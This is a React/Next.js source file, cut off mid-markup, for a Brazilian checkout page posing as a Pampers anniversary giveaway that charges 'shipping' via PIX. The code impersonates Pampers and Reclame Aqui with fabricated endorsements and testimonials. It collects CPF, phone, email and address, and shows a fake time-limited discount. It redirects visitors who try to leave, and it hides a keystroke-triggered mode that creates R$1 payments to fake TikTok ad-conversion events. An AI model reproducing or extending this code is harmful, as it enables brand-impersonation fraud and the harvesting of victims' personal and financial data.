"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
import { Star, Shield, Check, ChevronDown, ChevronUp, Package, Truck, CreditCard } from "lucide-react"
import Image from "next/image"
import { processPayment } from "@/app/actions/payment"
import { PixPayment } from "@/components/pix-payment"
import { UTMTracker } from "@/lib/utm-tracker"

// Função para validar CPF
const validateCPF = (cpf: string) => {
  const cleanCPF = cpf.replace(/\D/g, "")

  if (cleanCPF.length !== 11) return false

  // Verifica se todos os dígitos são iguais
  if (/^(\d)\1{10}$/.test(cleanCPF)) return false

  // Validação do primeiro dígito verificador
  let sum = 0
  for (let i = 0; i < 9; i++) {
    sum += Number.parseInt(cleanCPF.charAt(i)) * (10 - i)
  }
  let remainder = 11 - (sum % 11)
  if (remainder === 10 || remainder === 11) remainder = 0
  if (remainder !== Number.parseInt(cleanCPF.charAt(9))) return false

  // Validação do segundo dígito verificador
  sum = 0
  for (let i = 0; i < 10; i++) {
    sum += Number.parseInt(cleanCPF.charAt(i)) * (11 - i)
  }
  remainder = 11 - (sum % 11)
  if (remainder === 10 || remainder === 11) remainder = 0
  if (remainder !== Number.parseInt(cleanCPF.charAt(10))) return false

  return true
}

// Função para formatar CPF
const formatCPF = (value: string) => {
  const cleanValue = value.replace(/\D/g, "")
  return cleanValue
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})/, "$1-$2")
    .replace(/(-\d{2})\d+?$/, "$1")
}

// Função para validar email
const validateEmail = (email: string) => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  return emailRegex.test(email)
}

// Interface para os testimonials
interface Testimonial {
  name: string
  comment: string
  rating: number
  avatar: string
  isOfficial?: boolean // Propriedade opcional
}

export function CheckoutPage() {
  const [formData, setFormData] = useState({
    email: "",
    phone: "",
    fullName: "",
    cpf: "",
  })

  const [cartExpanded, setCartExpanded] = useState(true)
  const [currentStep, setCurrentStep] = useState<"identification" | "delivery" | "payment">("identification")
  const [addressData, setAddressData] = useState({
    cep: "",
    address: "",
    number: "",
    complement: "",
    neighborhood: "",
    city: "",
    state: "",
    country: "Brasil",
  })
  const [selectedShipping, setSelectedShipping] = useState<string>("")
  const [showShippingOptions, setShowShippingOptions] = useState(false)
  const [selectedBumps, setSelectedBumps] = useState<number[]>([])
  const [isProcessing, setIsProcessing] = useState(false)
  const [paymentResult, setPaymentResult] = useState<any>(null)
  const [showPixPayment, setShowPixPayment] = useState(false)
  const [cpfError, setCpfError] = useState("")
  const [emailError, setEmailError] = useState("")
  const [utmTracker, setUtmTracker] = useState<UTMTracker | null>(null)
  const [initiateCheckoutFired, setInitiateCheckoutFired] = useState(false)

  // 🧪 SISTEMA DE TESTE REAL - Pagamento R$ 1,00
  const [testMode, setTestMode] = useState(false)
  const [secretSequence, setSecretSequence] = useState<string[]>([])

  // Declarações dos testimonials usando o tipo correto
  const testimonials1: Testimonial[] = [
    {
      name: "Luci neide soares",
      comment:
        "fiz em 4 endereços diferente para toda minha família, chegou em todos endereços certinho, aproveitei que eu já vou fazer denovo, chegaaa mesmooo",
      rating: 5,
      avatar: "/images/lucida.webp",
    },
    {
      name: "Larissa vitoria",
      comment: "em apenas 3 dias chegou em casa, já usei no meu bebe estou amando",
      rating: 4,
      avatar: "/images/larissa.jpeg",
    },
  ]

  const testimonials2: Testimonial[] = [
    {
      name: "Reclame aqui",
      comment:
        "Empresa confiável avaliada em 5 estrelas, com entregas antes do prazo, aprovada por nossa equipe de analise",
      rating: 5,
      avatar: "/images/reclame-aqui-logo.png",
      isOfficial: true,
    },
    {
      name: "Pampers Oficial",
      comment: "Estamos celebrando nossos 60 anos e decidimos presentear todas mamães, registe seu presente",
      rating: 5,
      avatar: "/images/pampers-icon.png",
      isOfficial: true,
    },
    {
      name: "Aline rodrigues",
      comment:
        "No começo eu não acreditei muito, até que o produto chegou em casa certinho, aí me veio no dever falar aqui falar que a loja é confiável e que podem comprar tranquilas",
      rating: 5,
      avatar: "/images/regine.webp",
    },
  ]

  const orderBumps = [
    {
      id: 1,
      title: "12 pacotes extra de lenços",
      description: "48uni em cada pacote (Receba tudo no mesmo frete)",
      price: "R$25,08",
      image: "/images/lencos-extra.png",
    },
    {
      id: 2,
      title: "Shampoo Sabonete Condicionador",
      description: "Kit completo de higiene para seu bebê",
      price: "R$16,17",
      image: "/images/shampoo-kit.png",
    },
    {
      id: 3,
      title: "Kit Higiene Cuidados Saúde Bebê",
      description: "Tudo que você precisa para cuidar da saúde do seu bebê com Zeep",
      price: "R$19,00",
      image: "/images/kit-higiene.png",
    },
  ]

  // 🧪 SISTEMA DE TESTE REAL - Detectar sequência de teclas
  useEffect(() => {
    const handleKeyPress = (e: KeyboardEvent) => {
      const newSequence = [...secretSequence, e.key.toLowerCase()].slice(-9) // Manter apenas últimas 9 teclas
      setSecretSequence(newSequence)

      // Sequência secreta: "testreal1" (para pagamento real de R$ 1,00)
      if (newSequence.join("") === "testreal1") {
        setTestMode(true)
        console.log("🧪 MODO TESTE REAL ATIVADO - Pagamento R$ 1,00 para gerar Purchase real!")
        alert(
          "🧪 MODO TESTE REAL ATIVADO!\n\nVocê pode fazer um pagamento REAL de R$ 1,00\npara gerar evento Purchase real no TikTok Pixel.\n\n💳 Taxa LiraPay: R$ 0,26 (26,4%)\n💵 Valor líquido: R$ 0,74\n\nPerfeito para testar campanhas!",
        )
      }
    }

    window.addEventListener("keydown", handleKeyPress)
    return () => window.removeEventListener("keydown", handleKeyPress)
  }, [secretSequence])

  // Adicionar após as constantes orderBumps
  const getShippingPrice = (shippingType: string) => {
    // 🧪 Se modo teste real ativo, valor mínimo R$ 1,00
    if (testMode) return 1.0

    switch (shippingType) {
      case "full":
        return 24.9
      case "sedex":
        return 19.9
      case "pac":
        return 12.8
      default:
        return 0
    }
  }

  const getOrderBumpPrice = (bumpId: number) => {
    // 🧪 Se modo teste real ativo, order bumps não disponíveis (manter apenas frete)
    if (testMode) return 0

    const bump = orderBumps.find((b) => b.id === bumpId)
    if (!bump) return 0
    return Number.parseFloat(bump.price.replace("R$", "").replace(",", "."))
  }

  const calculateTotal = () => {
    // 🧪 Se modo teste real, forçar R$ 1,00
    if (testMode) return 1.0

    const shippingCost = getShippingPrice(selectedShipping)
    const orderBumpsCost = selectedBumps.reduce((total, bumpId) => {
      return total + getOrderBumpPrice(bumpId)
    }, 0)
    return shippingCost + orderBumpsCost
  }

  const handleInputChange = (field: string, value: string) => {
    if (field === "cpf") {
      const formattedCPF = formatCPF(value)
      setFormData((prev) => ({ ...prev, [field]: formattedCPF }))

      // Validar CPF quando tiver 11 dígitos
      const cleanCPF = value.replace(/\D/g, "")
      if (cleanCPF.length === 11) {
        if (validateCPF(cleanCPF)) {
          setCpfError("")
        } else {
          setCpfError("CPF inválido")
        }
      } else {
        setCpfError("")
      }
    } else if (field === "email") {
      setFormData((prev) => ({ ...prev, [field]: value }))

      // Validar email em tempo real
      if (value.length > 0) {
        if (validateEmail(value)) {
          setEmailError("")
        } else {
          setEmailError("Email inválido")
        }
      } else {
        setEmailError("")
      }
    } else {
      setFormData((prev) => ({ ...prev, [field]: value }))
    }
  }

  const handleAddressChange = (field: string, value: string) => {
    setAddressData((prev) => ({ ...prev, [field]: value }))

    // Mostrar opções de frete quando CEP for preenchido (8 dígitos)
    if (field === "cep" && value.replace(/\D/g, "").length === 8) {
      setShowShippingOptions(true)
    }
  }

  const StarRating = ({ rating }: { rating: number }) => (
    <div className="flex gap-1">
      {[1, 2, 3, 4, 5].map((star) => (
        <Star
          key={star}
          className={`w-4 h-4 ${star <= rating ? "fill-yellow-400 text-yellow-400" : "text-gray-300"}`}
        />
      ))}
    </div>
  )

  const handleCepChange = async (cep: string) => {
    const cleanCep = cep.replace(/\D/g, "")
    setAddressData((prev) => ({ ...prev, cep }))

    if (cleanCep.length === 8) {
      try {
        const response = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`)
        const data = await response.json()

        if (!data.erro) {
          setAddressData((prev) => ({
            ...prev,
            address: data.logradouro || "",
            neighborhood: data.bairro || "",
            city: data.localidade || "",
            state: data.uf || "",
          }))
        }
      } catch (error) {
        console.error("Erro ao buscar CEP:", error)
      }

      setShowShippingOptions(true)
    } else {
      setShowShippingOptions(false)
    }
  }

  const getStepStatus = (step: string) => {
    const steps = ["identification", "delivery", "payment"]
    const currentIndex = steps.indexOf(currentStep)
    const stepIndex = steps.indexOf(step)

    if (stepIndex < currentIndex) return "completed"
    if (stepIndex === currentIndex) return "active"
    return "pending"
  }

  const handleFinalizePurchase = async () => {
    setIsProcessing(true)

    try {
      const result = await processPayment({
        email: formData.email,
        phone: formData.phone,
        fullName: formData.fullName,
        cpf: formData.cpf,
        cep: addressData.cep,
        address: addressData.address,
        number: addressData.number,
        complement: addressData.complement,
        neighborhood: addressData.neighborhood,
        city: addressData.city,
        state: addressData.state,
        country: addressData.country,
        selectedShipping,
        selectedBumps,
        isTestMode: testMode, // 🧪 Passar flag do modo teste
      })

      if (result.success && result.totalAmount !== undefined) {
        setPaymentResult(result)
        setShowPixPayment(true)

        // 🧪 Log especial para modo teste
        if (testMode) {
          console.log("🧪 PIX TESTE REAL GERADO:")
          console.log("💰 Valor:", result.totalAmount)
          console.log("💳 Taxa LiraPay (26,4%):", (result.totalAmount * 0.264).toFixed(2))
          console.log("💵 Valor líquido:", (result.totalAmount * 0.736).toFixed(2))
          console.log("🆔 Transaction ID:", result.transactionId)
          console.log("🎯 Agora pague R$ 1,00 para gerar Purchase real!")
        }
      } else {
        alert(`Erro no pagamento: ${result.error || "Erro desconhecido"}`)
      }
    } catch (error) {
      console.error("Payment error:", error)
      alert("Erro interno. Tente novamente.")
    } finally {
      setIsProcessing(false)
    }
  }

  // EVENTO 2: AddToCart - Quando adiciona order bumps
  const handleOrderBumpAdd = (bumpId: number) => {
    if (!selectedBumps.includes(bumpId)) {
      setSelectedBumps([...selectedBumps, bumpId])

      // EVENTO 2: Disparar AddToCart para order bumps
      const bump = orderBumps.find((b) => b.id === bumpId)
      if (bump && utmTracker) {
        const bumpPrice = getOrderBumpPrice(bumpId)
        utmTracker.trackAddToCart(bumpPrice, `order-bump-${bumpId}`, bump.title)
        console.log("🛍️ EVENTO 2: AddToCart disparado - Order bump adicionado:", bump.title, bumpPrice)
      }
    }
  }

  const handlePaymentConfirmed = () => {
    // EVENTO 3: Disparar Purchase quando PIX é confirmado
    if (paymentResult && utmTracker && paymentResult.totalAmount !== undefined) {
      utmTracker.trackPurchase(paymentResult.totalAmount, paymentResult.transactionId)
      console.log(
        "💰 EVENTO 3: Purchase REAL disparado - Pagamento confirmado:",
        paymentResult.totalAmount,
        paymentResult.transactionId,
      )

      // 🧪 Log especial para modo teste
      if (testMode || paymentResult.isTestMode) {
        console.log("🎯 EVENTO PURCHASE REAL GERADO PARA TIKTOK!")
        console.log("✅ Agora você pode usar este evento nas campanhas do TikTok")
        console.log("📊 Valor:", paymentResult.totalAmount)
        console.log("💳 Taxa LiraPay:", (paymentResult.totalAmount * 0.264).toFixed(2))
        console.log("💵 Valor líquido:", (paymentResult.totalAmount * 0.736).toFixed(2))
        console.log("🆔 Transaction ID:", paymentResult.transactionId)
      }
    }
  }

  // Inicializar UTM Tracker
  useEffect(() => {
    const tracker = UTMTracker.getInstance()
    setUtmTracker(tracker)

    // EVENTO 1: InitiateCheckout - Disparar imediatamente (sem delay)
    if (!initiateCheckoutFired) {
      console.log("🎯 Firing InitiateCheckout immediately...")
      console.log("TikTok ready:", !!window.tiktokPixelReady)
      console.log("Meta fbq available:", !!window.fbq)

      const totalValue = calculateTotal() || 12.8 // Valor mínimo do frete PAC
      tracker.trackInitiateCheckout(totalValue)
      setInitiateCheckoutFired(true)
      console.log("🛒 EVENTO 1: InitiateCheckout disparado:", totalValue)
    }
  }, [initiateCheckoutFired])

  // Exit Intent - Redirecionamento para back redirect
  useEffect(() => {
    let isExiting = false

    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      // Não mostrar popup se estiver na tela de PIX ou processando pagamento
      if (showPixPayment || isProcessing) return

      // Verificar se tem dados preenchidos para mostrar aviso
      const hasData =
        formData.email ||
        formData.phone ||
        formData.fullName ||
        formData.cpf ||
        addressData.cep ||
        addressData.address ||
        selectedShipping ||
        selectedBumps.length > 0

      if (hasData) {
        e.preventDefault()
        e.returnValue = "Você tem um pedido em andamento. Tem certeza que deseja sair?"
        return "Você tem um pedido em andamento. Tem certeza que deseja sair?"
      }
    }

    const handleMouseLeave = (e: MouseEvent) => {
      // Não redirecionar se estiver na tela de PIX ou processando
      if (showPixPayment || isProcessing || isExiting) return

      // Detectar se o mouse saiu pela parte superior da página
      if (e.clientY <= 0) {
        isExiting = true

        // Redirecionar para a página de back redirect
        window.location.href = "https://ultimaschances.netlify.app"
      }
    }

    const handleVisibilityChange = () => {
      // Não redirecionar se estiver na tela de PIX ou processando
      if (showPixPayment || isProcessing || isExiting) return

      // Se a página ficou oculta (usuário mudou de aba/minimizou)
      if (document.hidden) {
        const hasData =
          formData.email ||
          formData.phone ||
          formData.fullName ||
          formData.cpf ||
          addressData.cep ||
          addressData.address ||
          selectedShipping ||
          selectedBumps.length > 0

        if (hasData) {
          // Aguardar um pouco para ver se o usuário volta
          setTimeout(() => {
            if (document.hidden && !isExiting) {
              isExiting = true
              window.location.href = "https://ultimaschances.netlify.app"
            }
          }, 3000) // 3 segundos de delay
        }
      }
    }

    // Adicionar event listeners
    window.addEventListener("beforeunload", handleBeforeUnload)
    document.addEventListener("mouseleave", handleMouseLeave)
    document.addEventListener("visibilitychange", handleVisibilityChange)

    // Cleanup
    return () => {
      window.removeEventListener("beforeunload", handleBeforeUnload)
      document.removeEventListener("mouseleave", handleMouseLeave)
      document.removeEventListener("visibilitychange", handleVisibilityChange)
    }
  }, [formData, addressData, selectedShipping, selectedBumps, showPixPayment, isProcessing])

  // Se está mostrando PIX, mostrar apenas a tela de pagamento
  if (showPixPayment && paymentResult) {
    return (
      <PixPayment
        pixPayload={paymentResult.pixPayload}
        transactionId={paymentResult.transactionId}
        totalAmount={paymentResult.totalAmount}
        onPaymentConfirmed={handlePaymentConfirmed}
        onGoBack={() => {
          setShowPixPayment(false)
          setPaymentResult(null)
        }}
      />
    )
  }

  // Resto do código do checkout permanece igual...
  return (
    <div className="min-h-screen bg-gray-50">
      {/* 🧪 PAINEL DE TESTE REAL */}
      {testMode && (
        <div className="fixed top-4 right-4 z-50 bg-green-600 text-white p-4 rounded-lg shadow-lg border-2 border-green-700">
          <div className="text-sm font-bold mb-2">🧪 MODO TESTE REAL</div>
          <div className="text-xs mb-3">
            • Pagamento REAL: R$ 1,00
            <br />• Taxa LiraPay: R$ 0,26 (26,4%)
            <br />• Valor líquido: R$ 0,74
            <br />• Evento Purchase REAL
            <br />• Válido para campanhas TikTok
          </div>
          <div className="text-xs mt-2 opacity-75 bg-green-700 p-2 rounded">
            ✅ Faça o checkout normalmente
            <br />✅ Pague R$ 1,00 via PIX
            <br />✅ Evento Purchase será real
          </div>
        </div>
      )}

      {/* Header */}
      <header className="bg-[#f2f2f2] border-b shadow-sm">
        <div className="max-w-6xl mx-auto px-4 py-4">
          <div className="flex flex-col items-center gap-4">
            {/* Logo centralizada */}
            <div className="flex justify-center">
              <Image
                src="/images/pampers-logo.png"
                alt="Pampers"
                width={200}
                height={80}
                className="h-12 w-auto sm:h-16"
                priority
              />
            </div>

            {/* Security Badge - apenas mobile */}
            <div className="flex items-center gap-2 text-sm lg:hidden">
              <Shield className="w-4 h-4 text-green-500" />
              <span className="text-green-600 font-medium">PAGAMENTO 100% SEGURO</span>
            </div>

            {/* Desktop Security Badge */}
            <div className="hidden lg:flex items-center gap-2 text-sm">
              <Shield className="w-5 h-5 text-green-500" />
              <span className="text-green-600 font-medium">PAGAMENTO 100% SEGURO</span>
            </div>
          </div>

          {/* Discount Banner */}
          <div
            className={`${testMode ? "bg-green-600" : "bg-[#2dacb5]"} text-white p-4 rounded-lg text-center mt-4 shadow-md`}
          >
            <div className="font-medium text-base">
              {testMode
                ? "🧪 MODO TESTE REAL - Pagamento R$ 1,00 para gerar Purchase real (taxa R$ 0,26)"
                : "Desconto Ativado ! Pague via pix agora e aproveite - válido somente até o fim do dia"}
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-6xl mx-auto px-4 py-6">
        <div className="space-y-6">
          {/* Right Column - Cart Summary */}
          <Card>
            <CardHeader>
              <div className="flex items-center justify-between">
                <CardTitle className="text-xl">Resumo do Pedido</CardTitle>
                <Button variant="ghost" size="sm" onClick={() => setCartExpanded(!cartExpanded)} className="p-2">
                  {cartExpanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                </Button>
              </div>
            </CardHeader>
            <CardContent className="space-y-4">
              {cartExpanded && (
                <>
                  {/* Product Item */}
                  <div className="flex gap-4 p-4 bg-gray-50 rounded-lg">
                    <div className="w-20 h-20 bg-white rounded-lg border-2 border-teal-200 flex items-center justify-center flex-shrink-0 overflow-hidden">
                      <Image
                        src="/images/pampers-product.png"
                        alt="Kit Pampers Premium"
                        width={80}
                        height={80}
                        className="w-full h-full object-cover"
                      />
                    </div>
                    <div className="flex-1">
                      <h3 className="font-semibold text-gray-900">
                        {testMode ? "🧪 Teste Real - Purchase Event" : "Kit Pampers Premium"}
                      </h3>
                      <p className="text-sm text-gray-600 mb-2">
                        {testMode
                          ? "Pagamento mínimo para gerar evento Purchase real"
                          : "9 Pacotes de Fraldas + 6 Pacotes de Lenços"}
                      </p>
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-gray-500">Quantidade: 1</span>
                      </div>
                    </div>
                  </div>

                  <Separator />
                </>
              )}

              {/* Price Breakdown */}
              <div className="space-y-3">
                <div className="flex justify-between text-sm">
                  <span className="text-gray-600">{testMode ? "Teste Real" : "Subtotal (1 item)"}</span>
                  <span className="font-medium">R$ {testMode ? "1,00" : "0,00"}</span>
                </div>

                {testMode && (
                  <div className="bg-green-50 p-3 rounded-lg border border-green-200">
                    <div className="text-xs text-green-700 space-y-1">
                      <div className="flex justify-between">
                        <span>Valor bruto:</span>
                        <span>R$ 1,00</span>
                      </div>
                      <div className="flex justify-between">
                        <span>Taxa LiraPay (26,4%):</span>
                        <span>- R$ 0,26</span>
                      </div>
                      <div className="flex justify-between font-medium border-t border-green-300 pt-1">
                        <span>Valor líquido:</span>
                        <span>R$ 0,74</span>
                      </div>
                    </div>
                  </div>
                )}

                {!testMode && selectedShipping && (
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-600">Frete ({selectedShipping.toUpperCase()})</span>
                    <span className="font-medium">
                      R$ {getShippingPrice(selectedShipping).toFixed(2).replace(".", ",")}
                    </span>
                  </div>
                )}

                {!testMode && selectedBumps.length > 0 && (
                  <div className="space-y-1">
                    {selectedBumps.map((bumpId) => {
                      const bump = orderBumps.find((b) => b.id === bumpId)
                      return bump ? (
                        <div key={bumpId} className="flex justify-between text-sm">
                          <span className="text-gray-600 text-xs">{bump.title}</span>
                          <span className="font-medium text-xs">{bump.price}</span>
                        </div>
                      ) : null
                    })}
                  </div>
                )}

                <Separator />

                <div className="flex justify-between text-lg font-bold">
                  <span>Total</span>
                  <div className="text-right">
                    <div className={`text-2xl ${testMode ? "text-green-600" : "text-green-600"}`}>
                      R$ {calculateTotal().toFixed(2).replace(".", ",")}
                    </div>
                    {testMode && <div className="text-xs text-green-600">TESTE REAL - R$ 1,00</div>}
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Left Column - Form and Steps */}
          <div className="space-y-6">
            {/* Progress Steps */}
            <Card>
              <CardContent className="p-6">
                <div className="flex items-center justify-between">
                  <div className="flex flex-col items-center flex-1">
                    <div
                      className={`w-10 h-10 ${
                        getStepStatus("identification") === "completed"
                          ? "bg-green-500 text-white"
                          : getStepStatus("identification") === "active"
                            ? "bg-teal-500 text-white"
                            : "bg-gray-300 text-gray-600"
                      } rounded-full flex items-center justify-center font-bold mb-2`}
                    >
                      {getStepStatus("identification") === "completed" ? (
                        <Check className="w-5 h-5" />
                      ) : (
                        <Package className="w-5 h-5" />
                      )}
                    </div>
                    <span
                      className={`text-sm font-medium ${
                        getStepStatus("identification") === "completed"
                          ? "text-green-600"
                          : getStepStatus("identification") === "active"
                            ? "text-teal-600"
                            : "text-gray-500"
                      }`}
                    >
                      Identificação
                    </span>
                  </div>
                  <div className="flex-1 h-px bg-gray-300 mx-4"></div>
                  <div className="flex flex-col items-center flex-1">
                    <div
                      className={`w-10 h-10 ${
                        getStepStatus("delivery") === "completed"
                          ? "bg-green-500 text-white"
                          : getStepStatus("delivery") === "active"
                            ? "bg-teal-500 text-white"
                            : "bg-gray-300 text-gray-600"
                      } rounded-full flex items-center justify-center font-bold mb-2`}
                    >
                      {getStepStatus("delivery") === "completed" ? (
                        <Check className="w-5 h-5" />
                      ) : (
                        <Truck className="w-5 h-5" />
                      )}
                    </div>
                    <span
                      className={`text-sm font-medium ${
                        getStepStatus("delivery") === "completed"
                          ? "text-green-600"
                          : getStepStatus("delivery") === "active"
                            ? "text-teal-600"
                            : "text-gray-500"
                      }`}
                    >
                      Entrega
                    </span>
                  </div>
                  <div className="flex-1 h-px bg-gray-300 mx-4"></div>
                  <div className="flex flex-col items-center flex-1">
                    <div
                      className={`w-10 h-10 ${
                        getStepStatus("payment") === "completed"
                          ? "bg-green-500 text-white"
                          : getStepStatus("payment") === "active"
                            ? "bg-teal-500 text-white"
                            : "bg-gray-300 text-gray-600"
                      } rounded-full flex items-center justify-center font-bold mb-2`}
                    >
                      {getStepStatus("payment") === "completed" ? (
                        <Check className="w-5 h-5" />
                      ) : (
                        <CreditCard className="w-5 h-5" />
                      )}
                    </div>
                    <span
                      className={`text-sm font-medium ${
                        getStepStatus("payment") === "completed"
                          ? "text-green-600"
                          : getStepStatus("payment") === "active"
                            ? "text-teal-600"
                            : "text-gray-500"
                      }`}
                    >
                      Pagamento
                    </span>
                  </div>
                </div>
              </CardContent>
            </Card>

            {currentStep === "identification" && (
              <Card>
                <CardHeader>
                  <CardTitle className="text-xl">Informações Pessoais</CardTitle>
                  <p className="text-sm text-gray-600">Preencha seus dados para continuar com o pedido</p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid md:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">E-mail *</label>
                      <Input
                        type="email"
                        placeholder="exemplo@email.com"
                        value={formData.email}
                        onChange={(e) => handleInputChange("email", e.target.value)}
                        className={`w-full ${emailError ? "border-red-500" : ""}`}
                        required
                      />
                      {emailError && <p className="text-xs text-red-600 mt-1">{emailError}</p>}
                      <p className="text-xs text-gray-500 mt-1">Digite um email válido para receber confirmações</p>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">Telefone *</label>
                      <Input
                        type="tel"
                        placeholder="(xx) xxxxx-xxxx"
                        value={formData.phone}
                        onChange={(e) => handleInputChange("phone", e.target.value)}
                        className="w-full"
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">Nome completo *</label>
                    <Input
                      type="text"
                      placeholder="Digite seu nome completo"
                      value={formData.fullName}
                      onChange={(e) => handleInputChange("fullName", e.target.value)}
                      className="w-full"
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">CPF *</label>
                    <Input
                      type="text"
                      placeholder="000.000.000-00"
                      value={formData.cpf}
                      onChange={(e) => handleInputChange("cpf", e.target.value)}
                      className={`w-full ${cpfError ? "border-red-500" : ""}`}
                      required
                      maxLength={14}
                    />
                    {cpfError && <p className="text-xs text-red-600 mt-1">{cpfError}</p>}
                    <p className="text-xs text-gray-500 mt-1">Digite um CPF válido</p>
                  </div>

                  <div className="bg-gray-50 p-4 rounded-lg">
                    <p className="text-sm text-gray-700 font-medium mb-3">
                      Usamos seus dados de forma 100% segura para garantir a sua satisfação:
                    </p>
                    <div className="space-y-2 text-sm text-gray-600">
                      <div className="flex items-center gap-2">
                        <Check className="w-4 h-4 text-green-500" />
                        <span>Enviar o seu comprovante de compra e pagamento;</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <Check className="w-4 h-4 text-green-500" />
                        <span>Ativar a sua garantia de devolução caso não fique satisfeito;</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <Check className="w-4 h-4 text-green-500" />
                        <span>Acompanhar o andamento do seu pedido;</span>
                      </div>
                    </div>
                  </div>

                  <Button
                    className="w-full bg-teal-500 hover:bg-teal-600 text-white font-medium py-3 text-lg"
                    onClick={() => setCurrentStep("delivery")}
                    disabled={
                      !formData.email ||
                      !formData.phone ||
                      !formData.fullName ||
                      !formData.cpf ||
                      cpfError !== "" ||
                      emailError !== "" ||
                      !validateEmail(formData.email)
                    }
                  >
                    CONTINUAR PARA ENTREGA →
                  </Button>
                </CardContent>
              </Card>
            )}

            {currentStep === "delivery" && (
              <Card>
                <CardHeader>
                  <CardTitle className="text-xl">Entrega</CardTitle>
                  <p className="text-sm text-gray-600">
                    {testMode ? "🧪 Modo teste - dados simbólicos" : "Outra pessoa irá receber o pedido?"}{" "}
                    {!testMode && <span className="text-blue-600 cursor-pointer hover:underline">Clique aqui</span>}
                  </p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">CEP *</label>
                    <Input
                      type="text"
                      placeholder="12345-000"
                      value={addressData.cep}
                      onChange={(e) => handleCepChange(e.target.value)}
                      className="w-full max-w-xs"
                      required
                    />
                  </div>

                  <div className="grid md:grid-cols-3 gap-4">
                    <div className="md:col-span-2">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Endereço *</label>
                      <Input
                        type="text"
                        placeholder="Rua, Avenida, Alameda"
                        value={addressData.address}
                        onChange={(e) => handleAddressChange("address", e.target.value)}
                        className="w-full"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">Número *</label>
                      <Input
                        type="text"
                        placeholder="1234"
                        value={addressData.number}
                        onChange={(e) => handleAddressChange("number", e.target.value)}
                        className="w-full"
                        required
                      />
                      <div className="flex items-center gap-2 mt-2">
                        <input type="checkbox" id="no-number" className="rounded" />
                        <label htmlFor="no-number" className="text-sm text-gray-600">
                          S/N
                        </label>
                      </div>
                    </div>
                  </div>

                  <div className="grid md:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">Complemento</label>
                      <Input
                        type="text"
                        placeholder="Apartamento, unidade, prédio, andar"
                        value={addressData.complement}
                        onChange={(e) => handleAddressChange("complement", e.target.value)}
                        className="w-full"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">Bairro *</label>
                      <Input
                        type="text"
                        placeholder="Centro"
                        value={addressData.neighborhood}
                        onChange={(e) => handleAddressChange("neighborhood", e.target.value)}
                        className="w-full"
                        required
                      />
                    </div>
                  </div>

                  <div className="grid md:grid-cols-3 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">Cidade *</label>
                      <Input
                        type="text"
                        placeholder="Cidade"
                        value={addressData.city}
                        onChange={(e) => handleAddressChange("city", e.target.value)}
                        className="w-full"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">Estado *</label>
                      <select
                        className="w-full p-2 border border-gray-300 rounded-md"
                        value={addressData.state}
                        onChange={(e) => handleAddressChange("state", e.target.value)}
                        required
                      >
                        <option value="">Selecione</option>
                        <option value="SP">São Paulo</option>
                        <option value="RJ">Rio de Janeiro</option>
                        <option value="MG">Minas Gerais</option>
                        {/* Adicionar outros estados */}
                      </select>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">País *</label>
                      <select
                        className="w-full p-2 border border-gray-300 rounded-md"
                        value={addressData.country}
                        onChange={(e) => handleAddressChange("country", e.target.value)}
                        required
                      >
                        <option value="Brasil">Brasil</option>
                      </select>
                    </div>
                  </div>

                  {/* Shipping Options */}
                  {showShippingOptions && (
                    <div className="mt-6">
                      <h3 className="text-lg font-medium mb-4">
                        {testMode ? "🧪 Opção de Teste (R$ 1,00)" : "Escolha o melhor frete para você"}
                      </h3>
                      {testMode && (
                        <div className="bg-green-50 p-3 rounded-lg mb-4 border border-green-200">
                          <p className="text-sm text-green-700 font-medium">
                            🧪 MODO TESTE REAL: Todas as opções custam R$ 1,00 para gerar Purchase real
                          </p>
                          <p className="text-xs text-green-600 mt-1">Taxa LiraPay: R$ 0,26 | Valor líquido: R$ 0,74</p>
                        </div>
                      )}
                      <div className="space-y-3">
                        <div
                          className={`border-2 rounded-lg p-4 cursor-pointer transition-all ${
                            selectedShipping === "full"
                              ? "border-blue-500 bg-blue-50"
                              : "border-gray-200 hover:border-gray-300"
                          }`}
                        >
                          <label className="flex items-center justify-between cursor-pointer">
                            <div className="flex items-center gap-3">
                              <input
                                type="radio"
                                name="shipping"
                                value="full"
                                checked={selectedShipping === "full"}
                                onChange={(e) => setSelectedShipping(e.target.value)}
                                className="w-4 h-4 text-blue-600"
                              />
                              <div>
                                <div className="font-medium">
                                  {testMode ? "🧪 Teste Real - Opção 1" : "Frete Full (Receba em Até 24hrs)"}
                                </div>
                                <div className="text-sm text-gray-600">
                                  {testMode ? "Pagamento mínimo para teste" : "Chegará amanhã (11:00 às 16:00)"}
                                </div>
                              </div>
                            </div>
                            <div className="font-bold text-lg">R$1,00</div>
                          </label>
                        </div>

                        <div
